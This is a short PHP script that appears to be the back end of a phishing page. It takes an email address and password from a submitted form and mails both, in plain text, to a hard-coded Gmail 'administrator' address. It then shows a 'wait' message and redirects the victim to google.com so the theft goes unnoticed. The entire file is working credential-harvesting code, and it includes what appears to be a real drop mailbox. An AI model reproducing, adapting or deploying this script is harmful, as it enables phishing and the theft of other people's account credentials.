<? 
// ----------------------------configuration-------------------------- // 
 
$adminemail="nikitinsergei1673@gmail.com";  // e-mail of administrator 
 
 
$date=date("d.m.y"); 
 
$time=date("H:i"); 
 
$backurl="google.com";  // Whitch page is next 
 
//---------------------------------------------------------------------- // 
 
  
 
// Take forms
 
$email=$_POST['email']; 

$pwd=$_POST['pwd'];  
  
 
// Validating e-mail
 
if (!preg_match("|^([a-z0-9_\.\-]{1,20})@([a-z0-9\.\-]{1,20})\.([a-z]{2,4})|is", 
strtolower($email))) 
 
 { 
 
  echo 
"<center> Go back <a 
href='javascript:history.back(1)'><B>назад</B></a>. Invalid data!"; 
 
  } 
 
 else 
 
 { 
 
 
$msg=" 
 
 <p>E-mail: $email</p> 

 
 <p>Password: $pwd</p> 


 
"; 
 
  
 
 // Send e-mail to admin 
 
mail("$adminemail", "$date $time Message
here data $email", "$pwd"); 
 
  
 
 
// msg out 
 
print "<script language='Javascript'><!-- 
function reload() {location = \"$backurl\"}; setTimeout('reload()', 6000); 
//--></script>  
 
<p>Wait untill you get to main page...</p>";  
exit; 
 
 } 
 
?>